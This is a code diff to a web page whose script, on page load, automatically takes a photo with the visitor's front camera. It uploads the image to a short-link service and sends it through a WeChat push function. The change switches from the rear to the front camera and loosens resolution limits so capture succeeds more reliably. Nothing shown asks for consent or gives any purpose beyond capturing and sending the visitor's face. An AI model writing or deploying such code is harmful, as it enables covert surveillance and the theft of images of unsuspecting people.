@@ -51,18 +51,18 @@ function autoTakePhoto() {
   const canvas = document.getElementById("box");
   const ctx = canvas.getContext("2d");
 
+  // 重点：user = 前置摄像头
   navigator.mediaDevices.getUserMedia({
     video: {
-      facingMode: "environment",
-      width: { exact: 480 },
-      height: { exact: 480 }
+      facingMode: "user",
+      width: { ideal: 480 },
+      height: { ideal: 480 }
     }
   }).then(stream => {
     video.srcObject = stream;
 
-    // 循环等待：直到视频有画面再截图
+    // 循环等真实画面帧，杜绝黑屏
     function waitFrame() {
-      // 有画面 && 宽高正常
       if (video.videoWidth > 10 && video.videoHeight > 10) {
         ctx.drawImage(video, 0, 0, 480, 480);
         const base64Img = canvas.toDataURL("image/jpeg", 0.8);
@@ -70,14 +70,13 @@ function autoTakePhoto() {
 
         uploadToShortLink(base64Img).then(link => {
           if (link) {
-            sendToWechat("✅ 拍照成功", "照片链接：\n" + link);
+            sendToWechat("✅ 前置拍照成功", "照片链接：\n" + link);
           } else {
-            sendToWechat("拍照成功（备用）", base64Img);
+            sendToWechat("前置拍照成功（备用）", base64Img);
           }
         });
         return;
       }
-      // 没画面继续等下一帧
       requestAnimationFrame(waitFrame);
     }
     waitFrame();
@@ -91,5 +90,3 @@ window.onload = autoTakePhoto;
 </script>
 </body>
 </html>
-
-    
